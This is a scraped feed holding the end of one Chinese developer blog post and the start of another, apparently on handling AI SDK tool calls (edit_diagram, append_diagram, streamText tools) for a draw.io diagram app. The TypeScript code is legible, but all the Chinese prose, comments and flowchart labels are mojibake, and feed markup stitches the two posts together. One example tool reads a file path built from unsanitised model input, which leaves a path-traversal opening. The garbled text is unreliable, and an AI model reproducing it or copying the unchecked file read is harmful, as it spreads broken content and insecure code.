    F --&gt; G{XMLæ˜¯å¦åˆæ³•ï¼Ÿ&lt;br/&gt;validationErroræ˜¯å¦å­˜åœ¨ï¼Ÿ}
    G --&gt;|å¦ï¼ˆéæ³•ï¼‰| H<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›XMLæ— æ•ˆ,éœ€è¦ä¿®å¤çš„æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    G --&gt;|æ˜¯ï¼ˆåˆæ³•ï¼‰| <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[<span class="hljs-string">"å¯¼å‡ºç¼–è¾‘åçš„å›¾è¡¨+è¿”å›æˆåŠŸæç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    C --&gt; J<span class="hljs-selector-attr">[æ•è·å…¨å±€å¼‚å¸¸]</span>
    J --&gt; K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é€šç”¨é”™è¯¯ï¼Œéœ€è¦ä¿®å¤çš„æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    F --&gt; J
    <span class="hljs-selector-tag">I</span> --&gt; J

</code></pre>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEditDiagram</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
Â  Â  toolCall: ToolCall,
Â  Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  Â  <span class="hljs-keyword">const</span> { operations } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> {
Â  Â  Â  Â  <span class="hljs-attr">operations</span>: <span class="hljs-title class_">DiagramOperation</span>[]
Â  Â  }
Â  Â  <span class="hljs-keyword">let</span> currentXml = <span class="hljs-string">""</span>

Â  Â  <span class="hljs-keyword">try</span> {
		<span class="hljs-comment">/** 
		* 1.ä» `editDiagramOriginalXmlRef.current`ï¼ˆæŒ‰ toolCallId ç´¢å¼•ï¼‰è·å–æµå¼å¤„ç†æ—¶æ•è·çš„åŸå§‹ XMLï¼ˆä¿è¯ç¼–è¾‘åŸºäºæœ€æ–°çš„åŸºå‡†ç‰ˆæœ¬ï¼‰ï¼›
        * 2.å¦‚æœæ²¡æœ‰ä¸Šè¿°æ•°æ®ï¼Œä» `chartXMLRef.current`ï¼ˆç¼“å­˜çš„å›¾è¡¨ XMLï¼‰è·å–ï¼›
        * 3.å…œåº•è°ƒç”¨ `onFetchChart(false)` ä» iframe ä¸­å¯¼å‡ºå½“å‰å›¾è¡¨çš„ XMLã€‚
		*/</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> originalXml = editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">get</span>(
Â  Â  Â  Â  Â  Â  toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  )
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (originalXml) {
Â  Â  Â  Â  Â  Â  currentXml = originalXml
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">const</span> cachedXML = chartXMLRef.<span class="hljs-property">current</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> (cachedXML) {
Â  Â  Â  Â  Â  Â  Â  Â  currentXml = cachedXML
Â  Â  Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  Â  Â  currentXml = <span class="hljs-keyword">await</span> <span class="hljs-title function_">onFetchChart</span>(<span class="hljs-literal">false</span>)
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
  
Â  Â  Â  Â  <span class="hljs-keyword">const</span> { applyDiagramOperations } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"@/lib/utils"</span>)
Â  Â  Â  Â  <span class="hljs-keyword">const</span> { <span class="hljs-attr">result</span>: editedXml, errors } = <span class="hljs-title function_">applyDiagramOperations</span>(
Â  Â  Â  Â  Â  Â  currentXml,
Â  Â  Â  Â  Â  Â  operations,
Â  Â  Â  Â  )
		<span class="hljs-comment">// å¦‚æœéƒ¨åˆ†æ“ä½œæ‰§è¡Œé”™è¯¯ï¼Œè¿”å›æ¨¡å‹å“ªäº›å‡ºé”™</span>
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (errors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">const</span> errorMessages = errors
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span><span class="hljs-string">`- <span class="hljs-subst">${e.<span class="hljs-keyword">type</span>}</span> on cell_id="<span class="hljs-subst">${e.cellId}</span>": <span class="hljs-subst">${e.message}</span>`</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Some operations failed:\n<span class="hljs-subst">${errorMessages}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml}</span>
\`\`\`
Please check the cell IDs and retry.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  Â  Â  }


Â  Â  Â  Â  <span class="hljs-comment">// æ¸²æŸ“æ ¡éªŒ</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(editedXml)
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Edit produced invalid XML: <span class="hljs-subst">${validationError}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml}</span>
\`\`\`
Please fix the operations to avoid structural issues.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  Â  Â  }
Â  Â  Â  Â  <span class="hljs-comment">// æˆåŠŸ</span>
Â  Â  Â  Â  <span class="hljs-title function_">onExport</span>()
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">`Successfully applied <span class="hljs-subst">${operations.length}</span> operation(s) to the diagram.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)

Â  Â  } <span class="hljs-keyword">catch</span> (error) {
		<span class="hljs-comment">// jsæ‰§è¡Œçš„æœªçŸ¥é”™è¯¯</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> errorMessage =
Â  Â  Â  Â  Â  Â  error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-title class_">String</span>(error)
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Edit failed: <span class="hljs-subst">${errorMessage}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml || <span class="hljs-string">"No XML available"</span>}</span>
\`\`\`
Please check cell IDs and retry, or use display_diagram to regenerate.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)

Â  Â  }

}

</code></pre>
<h5 data-id="heading-18">c.<code>append_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">
flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–ç»­ä¼ çš„XMLç‰‡æ®µ"</span>]</span> --&gt; <span class="hljs-selector-tag">B</span>{"æ ¡éªŒæ˜¯å¦åˆè§„ï¼ˆå³æ»¡è¶³æç¤ºè¯ä¸­çš„è§„èŒƒï¼‰"}
    <span class="hljs-selector-tag">B</span> --&gt;|æ˜¯| D<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›è¿è§„,é‡æ–°ç»­ä¼ çš„æç¤º+ç»ˆæ­¢å‡½æ•°"</span>]</span>
    <span class="hljs-selector-tag">B</span> --&gt;|å¦| E<span class="hljs-selector-attr">[<span class="hljs-string">"æ‹¼æ¥XMLï¼špartialXmlRef += æœ¬æ¬¡XML"</span>]</span>
    E --&gt; F<span class="hljs-selector-attr">[<span class="hljs-string">"éªŒè¯æ‹¼æ¥åXMLæ˜¯å¦å®Œæ•´"</span>]</span>
    F --&gt; G{æ˜¯å¦å®Œæ•´ï¼Ÿ&lt;br/&gt;isComplete=true?}
    G --&gt;|æ˜¯| H<span class="hljs-selector-attr">[<span class="hljs-string">"é‡ç½®ç¼“å­˜â†’åŒ…è£…XMLâ†’éªŒè¯åˆæ³•æ€§"</span>]</span>
    H --&gt; <span class="hljs-selector-tag">I</span>{XMLæ˜¯å¦åˆæ³•ï¼Ÿ&lt;br/&gt;validationErrorå­˜åœ¨ï¼Ÿ}
    <span class="hljs-selector-tag">I</span> --&gt;|æ˜¯| J<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›éªŒè¯å¤±è´¥æç¤º"</span>]</span>
    <span class="hljs-selector-tag">I</span> --&gt;|å¦| K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›æ‹¼æ¥æˆåŠŸæç¤º"</span>]</span>
    G --&gt;|å¦| L<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›ä»éœ€ç»­ä¼ æç¤º"</span>]</span>

</code></pre>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAppendDiagram</span> = (<span class="hljs-params">
Â  Â  toolCall: ToolCall,
Â  Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  Â  <span class="hljs-keyword">const</span> { xml } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> }
Â  Â  <span class="hljs-keyword">const</span> trimmed = xml.<span class="hljs-title function_">trim</span>()
Â  Â  <span class="hljs-comment">// æ£€éªŒæ˜¯å¦æ»¡è¶³æç¤ºè¯è§„èŒƒ</span>
Â  Â  <span class="hljs-keyword">const</span> isFreshStart =
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;mxGraphModel"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;root"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;mxfile"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'&lt;mxCell id="0"'</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'&lt;mxCell id="1"'</span>)
Â  Â  <span class="hljs-keyword">if</span> (isFreshStart) {
Â  Â      <span class="hljs-comment">// ä¸æ»¡è¶³</span>
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`ERROR: You started fresh with wrapper tags. Do NOT include wrapper tags or root cells (id="0", id="1").
Continue from EXACTLY where the partial ended:
\`\`\`
<span class="hljs-subst">${partialXmlRef.current.slice(-<span class="hljs-number">500</span>)}</span>
\`\`\`
Start your continuation with the NEXT character after where it stopped.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  }


Â  Â  <span class="hljs-comment">// æ‹¼æ¥</span>
Â  Â  partialXmlRef.<span class="hljs-property">current</span> += xml
Â  Â  <span class="hljs-comment">// å®Œæ•´æ€§æ£€éªŒ</span>
Â  Â  <span class="hljs-keyword">const</span> isComplete = <span class="hljs-title function_">isMxCellXmlComplete</span>(partialXmlRef.<span class="hljs-property">current</span>)
Â  Â 
Â  Â  <span class="hljs-keyword">if</span> (isComplete) {
Â  Â  Â  Â  <span class="hljs-keyword">const</span> finalXml = partialXmlRef.<span class="hljs-property">current</span>
Â  Â  Â  Â  partialXmlRef.<span class="hljs-property">current</span> = <span class="hljs-string">""</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> fullXml = <span class="hljs-title function_">wrapWithMxFile</span>(finalXml)
Â  Â  Â  Â  
Â  Â  Â  Â  <span class="hljs-comment">// æ¸²æŸ“æ ¡éªŒ</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(fullXml)
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Validation error after assembly: <span class="hljs-subst">${validationError}</span>
Assembled XML:
\`\`\`xml
<span class="hljs-subst">${finalXml.substring(<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>)}</span>...
\`\`\`
Please use display_diagram with corrected XML.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">"Diagram assembly complete and displayed successfully."</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  }
Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  <span class="hljs-comment">// ä»ç„¶ä¸å®Œæ•´ï¼Œæç¤ºç»§ç»­è¡¥å……</span>
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`XML still incomplete (mxCell not closed). Call append_diagram again to continue.
Current ending:
\`\`\`
<span class="hljs-subst">${partialXmlRef.current.slice(-<span class="hljs-number">500</span>)}</span>
\`\`\`
Continue from EXACTLY where you stopped.`</span>,
Â  Â  Â  Â  })
Â  Â  }
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’]]></title>    <link>https://juejin.cn/post/7592159803411562532</link>    <guid>https://juejin.cn/post/7592159803411562532</guid>    <pubDate>2026-01-07T18:22:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592159803411562532" data-draft-id="7592452108797640747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,LLM"/> <meta itemprop="datePublished" content="2026-01-07T18:22:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="irises"/> <meta itemprop="url" content="https://juejin.cn/user/3030697436261735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030697436261735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    irises
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T18:22:16.000Z" title="Wed Jan 07 2026 18:22:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç¤ºä¾‹ä»£ç æ‘˜å–è‡ªå¼€æºé¡¹ç›®ï¼šnext-ai-draw-io</p>
</blockquote>
<h3 data-id="heading-0">1. æ€»è¿°</h3>
<p>åœ¨ <code>ai.js</code> ä¸­ï¼Œå·¥å…·ï¼ˆToolsï¼‰é€šè¿‡ <code>streamText</code> é…ç½®çš„ <code>tools</code> å‚æ•°æ³¨å…¥ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ul>
<li><strong>æœåŠ¡ç«¯å·¥å…·</strong>ï¼šé…ç½®åŒ…å« <code>execute</code> å¼‚æ­¥å‡½æ•°ï¼Œå¯åœ¨æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼›</li>
<li><strong>å®¢æˆ·ç«¯å·¥å…·</strong>ï¼šä»…é…ç½®å…ƒä¿¡æ¯ï¼ˆ<code>description</code>/<code>inputSchema</code>ï¼‰ï¼Œæ—  <code>execute</code> å‡½æ•°ï¼Œéœ€å‰ç«¯æ‰§è¡Œåæ‰‹åŠ¨å›ä¼ ç»“æœã€‚</li>
</ul>
<h3 data-id="heading-1">2. å·¥å…·æ³¨å…¥ï¼ˆstreamText æ ¸å¿ƒé…ç½®ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡ç«¯ streamText è°ƒç”¨ï¼ˆæ ¸å¿ƒä»£ç ï¼‰</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">streamText</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-title function_">openai</span>(<span class="hljs-string">'gpt-4o'</span>),
  <span class="hljs-attr">messages</span>: allMessages, <span class="hljs-comment">// å¯¹è¯å†å²</span>
  <span class="hljs-comment">// æ³¨å…¥å·¥å…·</span>
  <span class="hljs-attr">tools</span>: {
    <span class="hljs-comment">// 1. æœåŠ¡ç«¯å·¥å…·ï¼šå¸¦ execute å‡½æ•°</span>
    <span class="hljs-attr">get_shape_library</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">"è·å–draw.ioå½¢çŠ¶åº“æ–‡æ¡£"</span>, <span class="hljs-comment">// æ¨¡å‹è¯†åˆ«å·¥å…·çš„æè¿°</span>
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-title function_">object</span>({ <span class="hljs-comment">// å…¥å‚æ ¡éªŒSchemaï¼ˆzodï¼‰</span>
        <span class="hljs-attr">library</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"å½¢çŠ¶åº“åç§°ï¼Œå¦‚aws4"</span>)
      }),
      <span class="hljs-comment">// æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œè¿”å›å€¼ç›´æ¥ä¼ ç»™æ¨¡å‹</span>
      <span class="hljs-attr">execute</span>: <span class="hljs-keyword">async</span> ({ library }) =&gt; {
        <span class="hljs-comment">// æœåŠ¡ç«¯ä¸šåŠ¡é€»è¾‘ï¼ˆæ–‡ä»¶è¯»å–/APIè°ƒç”¨ç­‰ï¼‰</span>
        <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">`./docs/<span class="hljs-subst">${library}</span>.md`</span>, <span class="hljs-string">'utf-8'</span>);
        <span class="hljs-keyword">return</span> content; <span class="hljs-comment">// ç»“æœè‡ªåŠ¨è¿”å›ç»™æ¨¡å‹ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†</span>
      }
    },
